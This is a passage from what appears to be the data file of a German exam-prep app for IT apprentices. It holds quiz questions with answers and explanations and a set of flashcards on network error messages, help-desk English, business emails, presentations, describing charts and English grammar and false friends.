      options: ["Der Server kennt den Benutzer, verweigert aber den Zugriff (fehlende Berechtigung)", "Der Benutzer ist nicht angemeldet", "Die Seite existiert nicht", "Der Server ist überlastet"],
      answer: 0,
      explain: "403 Forbidden = keine Berechtigung (Autorisierung fehlt). 401 Unauthorized bedeutet eigentlich „nicht authentifiziert“, 404 Not Found „Seite nicht gefunden“, 503 Service Unavailable „Dienst nicht verfügbar/überlastet“." },
    { id: "q-err-3", topic: "fehlermeldungen", type: "single",
      q: "<code>ping 10.10.0.20</code> funktioniert, aber <code>ping fileserver</code> meldet <em>“Ping request could not find host fileserver.”</em> Wo liegt das Problem?",
      options: ["bei der Namensauflösung (DNS)", "beim Netzwerkkabel", "beim Standardgateway", "bei der Firewall des Fileservers, die ICMP blockiert"],
      answer: 0,
      explain: "Da der Ping auf die IP-Adresse funktioniert, sind Kabel, Gateway und ICMP in Ordnung. Nur der Name kann nicht in eine IP-Adresse übersetzt werden – also DNS prüfen (nslookup, DNS-Server-Eintrag, DNS-Suffix)." },
    { id: "q-err-4", topic: "fehlermeldungen", type: "multi",
      exam: ["AP2"],
      q: "Welche Syslog-Schweregrade sind <strong>schwerwiegender</strong> als <em>Error</em> (Stufe 3)?",
      options: ["Emergency", "Alert", "Critical", "Warning", "Notice", "Debug"],
      answer: [0, 1, 2],
      explain: "Syslog: 0 Emergency, 1 Alert, 2 Critical, 3 Error, 4 Warning, 5 Notice, 6 Informational, 7 Debug. Je kleiner die Zahl, desto schwerer – also sind nur 0, 1 und 2 schwerer als Error." },
    { id: "q-err-5", topic: "fehlermeldungen", type: "input",
      exam: ["AP2"],
      q: "Welche Zahl hat der Syslog-Schweregrad <em>Warning</em>?",
      answer: ["4"],
      explain: "0 Emergency, 1 Alert, 2 Critical, 3 Error, 4 Warning, 5 Notice, 6 Informational, 7 Debug. Eselsbrücke: „Every Awesome Cisco Engineer Will Need Ice cream Daily“." },
    { id: "q-err-6", topic: "fehlermeldungen", type: "single",
      exam: ["AP2"],
      q: "Im auth.log stehen viele Zeilen <em>“Failed password for invalid user admin from 203.0.113.45”</em>. Was bedeuten sie?",
      options: ["Jemand versucht sich mit einem Benutzernamen anzumelden, den es auf dem System nicht gibt – typisch für einen Brute-Force-Angriff", "Der Benutzer admin hat sein Passwort vergessen und wurde gesperrt", "Das Passwort des Benutzers admin ist abgelaufen", "Die Anmeldung war erfolgreich, aber der Benutzer hat keine Rechte"],
      answer: 0,
      explain: "„Invalid user“ bedeutet: Der Benutzername existiert nicht. Viele solche Versuche von derselben IP-Adresse sind ein automatisiertes Durchprobieren von Namen und Passwörtern (Brute Force). Eine erfolgreiche Anmeldung würde als „Accepted password“ protokolliert." },
    { id: "q-err-7", topic: "fehlermeldungen", type: "tf",
      q: "Die ipconfig-Meldung <em>“Media disconnected”</em> deutet auf ein Problem mit dem DNS-Server hin.",
      answer: false,
      explain: "Falsch. „Media disconnected“ heißt: Am Netzwerkadapter gibt es keinen Link – Kabel gezogen oder defekt, Dose oder Switch-Port ohne Verbindung. DNS spielt erst eine Rolle, wenn eine IP-Verbindung besteht." },
    { id: "q-err-8", topic: "fehlermeldungen", type: "multi",
      exam: ["AP2"],
      q: "Which HTTP status codes indicate an error on the <strong>server side</strong>?",
      options: ["500 Internal Server Error", "502 Bad Gateway", "503 Service Unavailable", "404 Not Found", "403 Forbidden", "301 Moved Permanently"],
      answer: [0, 1, 2],
      explain: "5xx-Codes sind Serverfehler. 4xx-Codes sind Client-Fehler (z. B. falsche Adresse, fehlende Berechtigung), 3xx-Codes sind Umleitungen." },
    { id: "q-err-9", topic: "fehlermeldungen", type: "single",
      exam: ["AP2"],
      q: "Ein Cisco-Switch zeigt: <em>“GigabitEthernet0/1 is up, line protocol is down”</em>. Wie deutest du das?",
      options: ["Die physische Verbindung (Schicht 1) steht, aber auf Schicht 2 gibt es ein Problem, z. B. mit der Gegenstelle oder der Kapselung", "Die Schnittstelle ist administrativ abgeschaltet", "Das Kabel ist nicht eingesteckt", "Die Schnittstelle arbeitet fehlerfrei"],
      answer: 0,
      explain: "Der erste Teil („is up“) beschreibt den physischen Status, der zweite („line protocol“) die Sicherungsschicht. Up/down heißt also: Signal vorhanden, aber Schicht 2 gestört. Bei ausgestecktem Kabel käme „down, line protocol is down“, bei abgeschalteter Schnittstelle „administratively down“; fehlerfrei wäre „up, line protocol is up“." },
    { id: "q-err-10", topic: "fehlermeldungen", type: "single",
      q: "<code>ipconfig</code> shows <em>“Autoconfiguration IPv4 Address . . . : 169.254.23.5”</em>. What does this tell you?",
      options: ["Der Client hat keinen DHCP-Server erreicht und sich selbst eine APIPA-Adresse gegeben", "Der Client hat vom DHCP-Server eine gültige Adresse erhalten", "Die Adresse ist im Netz doppelt vergeben", "Der DNS-Server hat den Namen des Clients falsch aufgelöst"],
      answer: 0,
      explain: "Adressen aus 169.254.0.0/16 (APIPA, Automatic Private IP Addressing) vergibt Windows selbst, wenn keine DHCP-Antwort kommt. Nächste Schritte: DHCP-Server, DHCP-Relay und VLAN des Ports prüfen, dann ipconfig /renew. Ein Adresskonflikt würde als „IP address conflict“ gemeldet, DNS spielt hier keine Rolle." },
    { id: "q-support-1", topic: "support-kommunikation", type: "single",
      exam: [],
      q: "Which is the most polite way to ask a caller to restart the PC?",
      options: ["Could you restart your PC, please?", "Restart your PC now.", "You must restart your PC.", "Why haven't you restarted your PC yet?"],
      answer: 0,
      explain: "Eine Frage mit „Could you …, please?“ ist höflich und klingt nach Bitte. Der reine Imperativ und „You must“ wirken im Gespräch wie ein Befehl, die Warum-Frage klingt nach Vorwurf." },
    { id: "q-support-2", topic: "support-kommunikation", type: "single",
      exam: [],
      q: "Du buchstabierst am Telefon einen Benutzernamen. Welches Wort des NATO-Alphabets steht für den Buchstaben <strong>J</strong>?",
      options: ["Juliett", "Jupiter", "Jaguar", "Joker"],
      answer: 0,
      explain: "Im internationalen Buchstabieralphabet (NATO/ICAO) steht Juliett (offiziell mit zwei t) für J. Die anderen Wörter kommen darin nicht vor." },
    { id: "q-support-3", topic: "support-kommunikation", type: "single",
      exam: [],
      q: "How do you say the character <strong>_</strong> in a user name like <em>m_meyer</em>?",
      options: ["underscore", "hyphen", "backslash", "tilde"],
      answer: 0,
      explain: "_ = underscore (Unterstrich). Ein hyphen/dash ist der Bindestrich -, der backslash ist \\ und die tilde ist ~." },
    { id: "q-support-4", topic: "support-kommunikation", type: "multi",
      q: "Which phrases help to <strong>de-escalate</strong> a conversation with an angry customer?",
      options: ["I understand how frustrating this must be.", "I'm sorry for the inconvenience.", "Let me see what I can do for you.", "Calm down, please.", "That's not my problem."],
      answer: [0, 1, 2],
      explain: "Verständnis zeigen, sich für die Unannehmlichkeit entschuldigen und aktiv Hilfe anbieten wirkt deeskalierend. „Calm down“ wirkt bevormundend und verschärft die Situation, „That's not my problem“ weist die Verantwortung ab." },
    { id: "q-support-5", topic: "support-kommunikation", type: "single",
      q: "Was ist der Unterschied zwischen dem Ticketstatus <em>resolved</em> und <em>closed</em>?",
      options: ["resolved: Lösung bereitgestellt, Bestätigung durch den Anwender steht noch aus; closed: Ticket endgültig abgeschlossen", "resolved: Ticket an den 2nd Level weitergegeben; closed: Ticket gelöscht", "resolved: Ticket wartet auf Rückmeldung des Herstellers; closed: Ticket gelöst", "Es gibt keinen Unterschied, die Begriffe sind Synonyme"],
      answer: 0,
      explain: "Resolved heißt gelöst – der Anwender kann das Ergebnis noch prüfen, das Ticket kann bei Bedarf wieder geöffnet werden. Closed ist der endgültige Abschluss. Weitergeben heißt escalated bzw. assigned, Warten auf Dritte on hold/pending." },
    { id: "q-support-6", topic: "support-kommunikation", type: "tf",
      exam: [],
      q: "Nach <em>Would you mind …</em> folgt ein Verb mit der Endung -ing, z. B. <em>Would you mind checking the cable?</em>",
      answer: true,
      explain: "Richtig. „Would you mind + -ing“ ist eine sehr höfliche Bitte („Würde es Ihnen etwas ausmachen, …?“). Falsch wäre „Would you mind to check …“." },
    { id: "q-support-7", topic: "support-kommunikation", type: "multi",
      q: "Which pieces of information belong in a good support ticket?",
      options: ["a short, specific summary", "steps to reproduce the problem", "impact and urgency", "the agent's private phone number", "a guess about which colleague is to blame"],
      answer: [0, 1, 2],
      explain: "Ein gutes Ticket enthält eine aussagekräftige Zusammenfassung, Schritte zum Nachstellen (mit erwartetem und tatsächlichem Ergebnis) sowie Auswirkung und Dringlichkeit für die Priorität. Private Daten und Schuldzuweisungen gehören nicht hinein." },
    { id: "q-support-8", topic: "support-kommunikation", type: "single",
      q: "A user writes in the self-service portal: <em>“Could you please install Visio on my laptop?”</em> Which ticket type is this according to ITIL 4?",
      options: ["service request", "incident", "problem", "change"],
      answer: 0,
      explain: "Nichts ist gestört – der Anwender bittet um eine vereinbarte Standardleistung, also ein service request. Ein incident wäre eine Störung (z. B. Visio startet nicht), ein problem die Ursache einer oder mehrerer Störungen, ein change eine geplante Änderung an Systemen oder Diensten." },
    { id: "q-support-9", topic: "support-kommunikation", type: "single",
      q: "What does the ticket status <em>pending</em> (also <em>on hold</em>) mean?",
      options: ["Das Ticket wartet auf eine Zuarbeit, z. B. vom Anwender, vom Hersteller oder auf eine Lieferung", "Das Ticket wurde endgültig abgeschlossen", "Das Ticket wurde gerade angelegt und noch niemandem zugewiesen", "Das Ticket wurde an den 2nd-Level-Support weitergegeben"],
      answer: 0,
      explain: "Pending/on hold = wartend: Die Bearbeitung ruht, bis eine Information, ein Ersatzteil oder ein Termin vorliegt. Abgeschlossen heißt closed, neu angelegt new, weitergegeben escalated bzw. assigned. Ob die SLA-Uhr währenddessen weiterläuft, regelt das jeweilige SLA." },
    { id: "q-support-10", topic: "support-kommunikation", type: "input",
      q: "Der Service Desk hat im September 240 Anrufe angenommen, 180 davon wurden beim ersten Kontakt gelöst. Wie hoch ist die <em>first call resolution rate</em> in Prozent?",
      answer: ["75", "75 %", "75%", "75 prozent"],
      explain: "FCR = beim ersten Kontakt gelöste Anfragen ÷ alle Anfragen × 100 = 180 ÷ 240 × 100 = 75 %." },
    { id: "q-mail-1", topic: "business-emails", type: "single",
      exam: [],
      q: "A formal British email starts with <em>“Dear Sir or Madam,”</em>. Which sign-off is correct?",
      options: ["Yours faithfully,", "Yours sincerely,", "Cheers,", "Love,"],
      answer: 0,
      explain: "Britische Regel: Name unbekannt (Dear Sir or Madam) → Yours faithfully; Name bekannt (Dear Ms Jensen) → Yours sincerely. „Cheers“ ist umgangssprachlich, „Love“ privat. Neutral passt im Geschäftsalltag auch Kind regards." },
    { id: "q-mail-2", topic: "business-emails", type: "single",
      q: "Welche Betreffzeile ist für eine Anfrage an einen Lieferanten am besten geeignet?",
      options: ["Request for quotation: 12 notebooks for our Husum office", "Question", "Hello from Heide", "URGENT!!! PLEASE READ"],
      answer: 0,
      explain: "Ein guter Betreff nennt Anlass und Inhalt konkret, damit der Empfänger die Mail sofort einordnen kann. „Question“ und „Hello“ sagen nichts aus, Großbuchstaben und Ausrufezeichen wirken unhöflich und wie Spam." },
    { id: "q-mail-3", topic: "business-emails", type: "multi",
      q: "Which phrases are suitable for a <strong>formal</strong> business email?",
      options: ["I would like to order …", "Please find attached our offer.", "I look forward to hearing from you.", "Gimme the offer ASAP.", "Hey guys,"],
      answer: [0, 1, 2],
      explain: "„I would like to“, „Please find attached“ und „I look forward to hearing from you“ sind typische formelle Redemittel. „Gimme … ASAP“ und „Hey guys“ sind Umgangssprache und für Geschäftskontakte ungeeignet." },
    { id: "q-mail-4", topic: "business-emails", type: "tf",
      q: "Bei einer Rundmail an mehrere externe Kunden gehören alle Empfängeradressen ins CC-Feld.",
      answer: false,
      explain: "Falsch. Im CC sehen alle Empfänger alle Adressen – das legt personenbezogene Daten offen und kann gegen die DSGVO verstoßen. Externe Empfänger einer Rundmail gehören ins BCC (blind carbon copy)." },
    { id: "q-mail-5", topic: "business-emails", type: "single",
      exam: [],
      q: "Welche Anrede verwendest du für eine Frau, deren Familienstand du nicht kennst (Nachname Jensen)?",
      options: ["Dear Ms Jensen,", "Dear Miss Jensen,", "Dear Mrs Jensen,", "Dear Madam Jensen,"],
      answer: 0,
      explain: "„Ms“ ist die neutrale Anrede für Frauen unabhängig vom Familienstand und im Geschäftsleben Standard. „Miss“ (unverheiratet) und „Mrs“ (verheiratet) setzen den Familienstand voraus; „Madam“ steht nicht vor dem Nachnamen." },
    { id: "q-praes-1", topic: "praesentieren", type: "single",
      exam: [],
      q: "Which sentence introduces the <strong>agenda</strong> of a presentation?",
      options: ["I've divided my talk into three parts.", "As you can see on this slide, …", "To sum up, …", "That's a good question."],
      answer: 0,
      explain: "Mit „I've divided my talk into three parts. First, … Then, … Finally, …“ kündigst du die Gliederung an. „As you can see“ verweist auf eine Folie, „To sum up“ leitet die Zusammenfassung ein, „That's a good question“ reagiert auf eine Frage." },
    { id: "q-praes-2", topic: "praesentieren", type: "multi",
      q: "Welche Verhaltensweisen solltest du bei einer Präsentation <strong>vermeiden</strong>?",
      options: ["Hände in den Hosentaschen", "verschränkte Arme", "dem Publikum den Rücken zudrehen, um die Folie vorzulesen", "Blickkontakt mit dem ganzen Raum", "offene Gesten", "aufrecht und sicher stehen, Gewicht gleichmäßig verteilt"],
      answer: [0, 1, 2],
      explain: "Hände in den Taschen und verschränkte Arme wirken unsicher oder abweisend; wer sich zur Leinwand dreht und abliest, verliert den Kontakt zum Publikum. Blickkontakt, offene Gesten und ein sicherer Stand sind erwünscht." },
    { id: "q-praes-3", topic: "praesentieren", type: "single",
      q: "Was versteht man unter <em>signposting</em> in einer Präsentation?",
      options: ["Sätze, die dem Publikum zeigen, wo man in der Präsentation gerade ist und was als Nächstes kommt", "das Beschriften der Folien mit Seitenzahlen", "Hinweisschilder zum Präsentationsraum", "das Verteilen eines Handouts nach dem Vortrag"],
      answer: 0,
      explain: "Signposting = sprachliche Wegweiser wie „Let's move on to …“ oder „This brings me to my next point“. Sie machen die Struktur hörbar und helfen dem Publikum, dem roten Faden zu folgen." },
    { id: "q-praes-4", topic: "praesentieren", type: "tf",
      q: "Eine gute Präsentationsfolie enthält möglichst viel Text, damit das Publikum alles mitlesen kann.",
      answer: false,
      explain: "Falsch. Textwüsten lenken ab – das Publikum liest, statt zuzuhören. Besser: eine Idee pro Folie, wenige Stichworte, große Schrift, Grafiken. Details gehören in den Vortrag oder ein Handout." },
    { id: "q-praes-5", topic: "praesentieren", type: "single",
      exam: [],
      q: "Someone asks a question you cannot answer. What is the best reaction?",
      options: ["I'm afraid I don't know that right now, but I'll find out and get back to you.", "That's a stupid question.", "I don't know. Next question, please.", "You should have read the handout."],
      answer: 0,
      explain: "Ehrlich zugeben, dass man die Antwort nicht kennt, und eine Nachlieferung zusagen, wirkt professionell. Die anderen Reaktionen sind unhöflich, abwertend oder weichen der Frage aus." },
    { id: "q-graf-1", topic: "prozesse-grafiken", type: "single",
      exam: [],
      q: "Complete: <em>“The number of tickets rose ___ 420 ___ 460.”</em>",
      options: ["from … to", "by … at", "at … by", "of … by"],
      answer: 0,
      explain: "„from … to …“ nennt Start- und Endwert. „by“ nennt die Differenz (rose by 40), „at“ einen Stand (remained stable at 460), „of“ steht nach Nomen (an increase of 40)." },
    { id: "q-graf-2", topic: "prozesse-grafiken", type: "input",
      q: "Die Zahl der Tickets fiel von 610 auf 380. Berechne die Veränderung in Prozent (eine Nachkommastelle, mit Vorzeichen).",
      answer: ["-37,7", "-37.7", "−37,7", "−37.7", "-37,7 %", "-37.7 %", "−37,7 %"],
      explain: "(380 − 610) ÷ 610 × 100 = −230 ÷ 610 × 100 ≈ −37,7 %. Auf Englisch: “a drop of about 37.7 %”." },
    { id: "q-graf-3", topic: "prozesse-grafiken", type: "single",
      q: "Which type of chart is best to show the <strong>shares of a total</strong>, e.g. tickets by category?",
      options: ["pie chart", "line graph", "Gantt chart", "flowchart"],
      answer: 0,
      explain: "Ein Kreisdiagramm (pie chart) zeigt Anteile an einem Ganzen. Ein Liniendiagramm zeigt Entwicklungen über die Zeit, ein Gantt-Diagramm Projektabläufe, ein Flowchart Prozessschritte." },
    { id: "q-graf-4", topic: "prozesse-grafiken", type: "multi",
      q: "Which verbs describe a <strong>downward</strong> trend?",
      options: ["decline", "drop", "plummet", "soar", "level off", "climb"],
      answer: [0, 1, 2],
      explain: "decline, drop und plummet (stark fallen) beschreiben einen Rückgang. soar und climb stehen für Anstiege, level off für das Abflachen bzw. Stabilisieren." },
    { id: "q-graf-5", topic: "prozesse-grafiken", type: "tf",
      q: "Steigt die Verfügbarkeit eines Dienstes von 98 % auf 99 %, ist das ein Anstieg um einen <em>percentage point</em> (Prozentpunkt).",
      answer: true,
      explain: "Richtig. Die Differenz zweier Prozentwerte wird in Prozentpunkten angegeben: 99 % − 98 % = 1 Prozentpunkt. Relativ ist das ein Anstieg um 1 ÷ 98 × 100 ≈ 1,02 %." },
    { id: "q-gram-1", topic: "grammatik-false-friends", type: "single",
      q: "Im Handbuch steht: <em>“You must not open the case while the device is connected to power.”</em> Was bedeutet das?",
      options: ["Du darfst das Gehäuse nicht öffnen, solange das Gerät am Strom hängt.", "Du musst das Gehäuse nicht öffnen, solange das Gerät am Strom hängt.", "Du solltest das Gehäuse öffnen, solange das Gerät am Strom hängt.", "Du kannst das Gehäuse jederzeit öffnen."],
      answer: 0,
      explain: "„must not“ = nicht dürfen (Verbot). „Nicht müssen“ heißt „don't have to“ oder „needn't“. Diese Verwechslung kann bei Sicherheitshinweisen gefährlich werden." },
    { id: "q-gram-2", topic: "grammatik-false-friends", type: "single",
      q: "What does <em>eventually</em> mean in: <em>“After several restarts, the server eventually came back online.”</em>?",
      options: ["schließlich, am Ende", "eventuell, vielleicht", "sofort", "regelmäßig"],
      answer: 0,
      explain: "False Friend: „eventually“ heißt „schließlich/letztendlich“. Das deutsche „eventuell“ heißt „possibly“ oder „perhaps“." },
    { id: "q-gram-3", topic: "grammatik-false-friends", type: "single",
      exam: [],
      q: "Choose the correct passive form: <em>“The update ___ tonight.”</em>",
      options: ["will be installed", "will install", "is installing", "will be install"],
      answer: 0,
      explain: "Passiv = be + past participle; im Futur: will be + installed. „will install“ ist Aktiv (wer installiert, fehlt), „is installing“ Verlaufsform Aktiv, „will be install“ fehlt die 3. Form." },
    { id: "q-gram-4", topic: "grammatik-false-friends", type: "single",
      exam: [],
      q: "Complete: <em>“If you ___ the router, the connection will drop for two minutes.”</em>",
      options: ["restart", "will restart", "restarted", "would restart"],
      answer: 0,
      explain: "if-Satz Typ 1: if + simple present, Hauptsatz mit will. Im if-Teil steht nie „will“. „restarted“ und „would restart“ gehören zu Typ 2 (gedachte Situation)." },
    { id: "q-gram-5", topic: "grammatik-false-friends", type: "multi",
      q: "Welche Übersetzungen englischer Wörter sind <strong>richtig</strong>?",
      options: ["actual – tatsächlich", "become – werden", "sensible – vernünftig", "chef – Chef, Vorgesetzter", "handy – Mobiltelefon", "provision – Provision"],
      answer: [0, 1, 2],
      explain: "actual = tatsächlich, become = werden, sensible = vernünftig. Die anderen sind False Friends: chef = Koch (Chef = boss), handy = praktisch (Handy = mobile phone), provision = Bereitstellung (Provision = commission)." },
    { id: "q-gram-6", topic: "grammatik-false-friends", type: "tf",
      exam: [],
      q: "<em>Since</em> steht mit einem Zeitraum (z. B. three days), <em>for</em> mit einem Zeitpunkt (z. B. Monday).",
      answer: false,
      explain: "Umgekehrt: „since“ + Zeitpunkt (since Monday, since the update), „for“ + Zeitraum (for three days). Beides steht meist mit dem present perfect: “The error has occurred since Monday.”" },
    { id: "q-gram-7", topic: "grammatik-false-friends", type: "input",
      exam: [],
      q: "Wie lautet die dritte Form (past participle) von <em>write</em>?",
      answer: ["written"],
      explain: "write – wrote – written. Beispiel im Passiv: “The script was written in PowerShell.”" },
    { id: "q-gram-8", topic: "grammatik-false-friends", type: "single",
      q: "Wie übersetzt du richtig: „Wir setzen die Passwortrichtlinie <strong>konsequent</strong> durch.“?",
      options: ["We enforce the password policy consistently.", "We enforce the password policy consequently.", "We enforce the password policy eventually.", "We enforce the password policy actually."],
      answer: 0,
      explain: "„konsequent“ = consistent(ly). False Friends: consequently = folglich, eventually = schließlich, actually = tatsächlich. Keins davon trifft die Bedeutung „ohne Ausnahme, beharrlich“." },
  ],
  cards: [
    { topic: "pruefung-lesen", f: "Skimming", b: "Überfliegen eines Textes (Überschriften, erste Sätze), um das Thema zu erfassen." },
    { topic: "pruefung-lesen", f: "Scanning", b: "Gezieltes Suchen nach bestimmten Informationen (Zahlen, Schlüsselwörter) – erst die Frage lesen, dann suchen." },
    { topic: "pruefung-lesen", f: "In welcher Sprache antwortest du in der AP1 auf Fragen zu einem englischen Text?", b: "Auf Deutsch – außer die Aufgabe verlangt ausdrücklich Englisch." },
    { topic: "pruefung-lesen", f: "up to", b: "bis zu – Höchstwert unter Idealbedingungen, nicht garantiert." },
    { topic: "pruefung-lesen", f: "unless", b: "außer wenn, es sei denn – kehrt eine Bedingung um." },
    { topic: "vokabeln-hardware", f: "power consumption", b: "Leistungsaufnahme (in W); typical = typisch, max. = maximal." },
    { topic: "vokabeln-hardware", f: "efficiency (PSU)", b: "Wirkungsgrad η des Netzteils, z. B. 90 % → η = 0,9." },
    { topic: "vokabeln-hardware", f: "hot-swappable", b: "im laufenden Betrieb austauschbar (z. B. Festplatten, Netzteile im Server)." },
    { topic: "vokabeln-hardware", f: "daisy chaining", b: "Reihenschaltung: Gerät 2 hängt an Gerät 1 statt direkt am PC (z. B. Monitore per DisplayPort MST)." },
    { topic: "vokabeln-hardware", f: "backward compatible", b: "abwärtskompatibel – funktioniert auch mit älteren Standards/Versionen." },
    { topic: "vokabeln-hardware", f: "heater (Kamera-Datenblatt)", b: "eingebaute Heizung, damit das Gerät bei Frost funktioniert und nicht beschlägt." },
    { topic: "vokabeln-hardware", f: "fanless", b: "lüfterlos – leise, weniger Staub, aber begrenzte Kühlleistung." },
    { topic: "vokabeln-hardware", f: "warranty", b: "(Hersteller-)Garantie – nicht die gesetzliche Gewährleistung." },
    { topic: "vokabeln-hardware", f: "memory vs. storage", b: "Arbeitsspeicher (RAM) vs. Massenspeicher (SSD/HDD)." },
    { topic: "vokabeln-netzwerk-security", f: "bandwidth vs. throughput", b: "theoretische maximale Datenrate vs. tatsächlich erreichter Durchsatz." },
    { topic: "vokabeln-netzwerk-security", f: "latency", b: "Verzögerung/Laufzeit eines Pakets (ms); jitter = Schwankung der Latenz." },
    { topic: "vokabeln-netzwerk-security", f: "default gateway", b: "Standardgateway – Router, über den Pakete in fremde Netze gehen." },
    { topic: "vokabeln-netzwerk-security", f: "authentication vs. authorization", b: "Wer bist du? (Identität prüfen) vs. Was darfst du? (Rechte prüfen)." },
    { topic: "vokabeln-netzwerk-security", f: "threat – vulnerability – exploit", b: "Bedrohung – Schwachstelle – Angriffscode, der die Schwachstelle ausnutzt." },
    { topic: "vokabeln-netzwerk-security", f: "data breach", b: "Datenpanne/Verletzung des Schutzes personenbezogener Daten – nach DSGVO in der Regel innerhalb von 72 h an die Aufsichtsbehörde zu melden." },
    { topic: "vokabeln-netzwerk-security", f: "least privilege", b: "Prinzip der minimalen Rechte: nur so viele Rechte wie für die Aufgabe nötig." },
    { topic: "vokabeln-netzwerk-security", f: "GDPR", b: "General Data Protection Regulation = DSGVO." },
    { topic: "vokabeln-software-cloud", f: "deprecated", b: "abgekündigt – funktioniert noch, wird aber künftig entfernt." },
    { topic: "vokabeln-software-cloud", f: "rollback", b: "Zurücksetzen auf den vorherigen, funktionierenden Stand nach einer fehlgeschlagenen Änderung." },
    { topic: "vokabeln-software-cloud", f: "on-premises", b: "im eigenen Haus/Rechenzentrum betrieben (Gegenteil: Cloud)." },
    { topic: "vokabeln-software-cloud", f: "tenant", b: "Mandant – abgegrenzter Bereich eines Kunden in einer Cloud-Plattform." },
    { topic: "vokabeln-software-cloud", f: "vendor lock-in", b: "starke Abhängigkeit von einem Anbieter; Wechsel wird teuer oder aufwendig." },
    { topic: "vokabeln-software-cloud", f: "hallucination (AI)", b: "plausibel klingende, aber falsche Antwort einer KI." },
    { topic: "vokabeln-software-cloud", f: "Erlaubte Ausfallzeit bei 99,9 % im 30-Tage-Monat", b: "0,001 × 43.200 min = 43,2 min." },
    { topic: "abkuerzungen", f: "ETA", b: "estimated time of arrival – voraussichtliche Ankunft/Lieferung." },
    { topic: "abkuerzungen", f: "RMA", b: "return merchandise authorization – Rücksendenummer für Reparatur/Austausch." },
    { topic: "abkuerzungen", f: "EOL / EOS", b: "end of life / end of support – Produktionsende / keine Updates und kein Support mehr." },
    { topic: "abkuerzungen", f: "TBD", b: "to be determined – noch offen, wird noch festgelegt." },
    { topic: "abkuerzungen", f: "e.g. / i.e.", b: "zum Beispiel / das heißt." },
    { topic: "abkuerzungen", f: "10/02/2026 in einer US-Mail", b: "2. Oktober 2026 (Monat/Tag/Jahr). Eindeutig: ISO 2026-10-02." },
    { topic: "abkuerzungen", f: "°F in °C", b: "°C = (°F − 32) × 5/9, z. B. 104 °F = 40 °C." },
    { topic: "abkuerzungen", f: "billion / trillion", b: "Milliarde (10⁹) / Billion (10¹²)." },
    { topic: "datenblatt-manual", f: "DANGER – WARNING – CAUTION – NOTICE", b: "führt zu Tod/schwerer Verletzung – kann dazu führen – leichte/mittlere Verletzung möglich – Sachschaden möglich." },
    { topic: "datenblatt-manual", f: "Semantic Versioning MAJOR.MINOR.PATCH", b: "MAJOR = inkompatible Änderungen, MINOR = neue kompatible Funktionen, PATCH = Fehlerkorrekturen." },
    { topic: "datenblatt-manual", f: "breaking change", b: "inkompatible Änderung – bestehende Konfigurationen funktionieren danach nicht mehr." },
    { topic: "datenblatt-manual", f: "known issue / workaround", b: "bekannter, noch nicht behobener Fehler / Übergangslösung, um ihn zu umgehen." },
    { topic: "datenblatt-manual", f: "IEEE 802.3af / 802.3at", b: "PoE: 15,4 W am Port / 12,95 W am Gerät · PoE+: 30 W / 25,5 W." },
    { topic: "datenblatt-manual", f: "IP67", b: "Schutzart: staubdicht (6), geschützt gegen zeitweiliges Untertauchen (7)." },
    { topic: "fehlermeldungen", f: "Request timed out.", b: "Keine Antwort in der Wartezeit – Ziel aus, ICMP blockiert oder Routingproblem." },
    { topic: "fehlermeldungen", f: "Connection refused", b: "Ziel erreichbar, aber am Port lauscht kein Dienst bzw. Verbindung wird aktiv abgelehnt." },
    { topic: "fehlermeldungen", f: "Ping request could not find host …", b: "Name nicht auflösbar → DNS prüfen (nslookup, ipconfig /all)." },
    { topic: "fehlermeldungen", f: "401 vs. 403", b: "401 Unauthorized = nicht authentifiziert; 403 Forbidden = keine Berechtigung." },
    { topic: "fehlermeldungen", f: "Syslog-Schweregrade 0–7", b: "Emergency, Alert, Critical, Error, Warning, Notice, Informational, Debug." },
    { topic: "fehlermeldungen", f: "No space left on device", b: "Datenträger/Partition voll." },
    { topic: "support-kommunikation", f: "Anrufer höflich um eine Aktion bitten", b: "Could you …, please? / Would you mind …ing …?" },
    { topic: "support-kommunikation", f: "Anrufer in die Warteschleife bitten", b: "Would you mind holding for a moment? / Could you hold the line, please?" },
    { topic: "support-kommunikation", f: "an den 2nd Level weitergeben", b: "I'll escalate this to our second-level support. / I'll put you through to …" },
    { topic: "support-kommunikation", f: "Deeskalieren", b: "I understand how frustrating this must be. I'm sorry for the inconvenience. Let me see what I can do." },
    { topic: "support-kommunikation", f: "@ . _ - /", b: "at · dot · underscore · hyphen/dash · slash" },
    { topic: "support-kommunikation", f: "priority", b: "ergibt sich aus impact (Auswirkung) und urgency (Dringlichkeit) – meist über eine Prioritätsmatrix (z. B. high/high → 1 – critical)." },
    { topic: "business-emails", f: "Dear Sir or Madam → ?", b: "Yours faithfully (britisch); bei bekanntem Namen: Yours sincerely." },
    { topic: "business-emails", f: "Anhang ankündigen", b: "Please find attached … / I have attached …" },
    { topic: "business-emails", f: "Standard-Schlusssatz", b: "I look forward to hearing from you. / Please do not hesitate to contact me if you have any questions." },
    { topic: "business-emails", f: "Ms", b: "neutrale Anrede für Frauen, unabhängig vom Familienstand." },
    { topic: "business-emails", f: "CC vs. BCC", b: "Kopie (für alle sichtbar) vs. Blindkopie (Adressen verborgen) – externe Rundmails ins BCC." },
    { topic: "praesentieren", f: "Agenda ankündigen", b: "I've divided my talk into three parts. First, … Then, … Finally, …" },
    { topic: "praesentieren", f: "Überleiten", b: "Let's move on to … / This brings me to my next point." },
    { topic: "praesentieren", f: "Zusammenfassen", b: "To sum up, … / Let me summarise the main points." },
    { topic: "praesentieren", f: "Körpersprache: 4 Regeln", b: "aufrecht stehen, offene Gesten, Blickkontakt mit dem ganzen Raum, nicht zur Leinwand drehen." },
    { topic: "prozesse-grafiken", f: "rose from 20 to 35 / rose by 15 / stood at 35", b: "Start- und Endwert / Differenz / Stand." },
    { topic: "prozesse-grafiken", f: "Veränderung in %", b: "(neu − alt) ÷ alt × 100" },
    { topic: "prozesse-grafiken", f: "plummet / soar / level off", b: "stark fallen / stark steigen / sich einpendeln." },
    { topic: "prozesse-grafiken", f: "Sequencing-Wörter", b: "First – Then/Next – After that – Finally" },
    { topic: "grammatik-false-friends", f: "must not vs. don't have to", b: "nicht dürfen vs. nicht müssen." },
    { topic: "grammatik-false-friends", f: "Passiv bilden", b: "be + past participle: is installed, was installed, has been installed, will be installed." },
    { topic: "grammatik-false-friends", f: "if-Satz Typ 1", b: "if + present, will + Grundform – kein will im if-Teil." },
    { topic: "grammatik-false-friends", f: "become / eventually / actual", b: "werden / schließlich / tatsächlich (nicht: bekommen / eventuell / aktuell)." },
    { topic: "grammatik-false-friends", f: "Beamer / Handy / Homeoffice auf Englisch", b: "projector / mobile phone (cell phone) / working from home, remote work." },
    { topic: "grammatik-false-friends", f: "since vs. for", b: "since + Zeitpunkt (since Monday), for + Zeitraum (for three days)." },
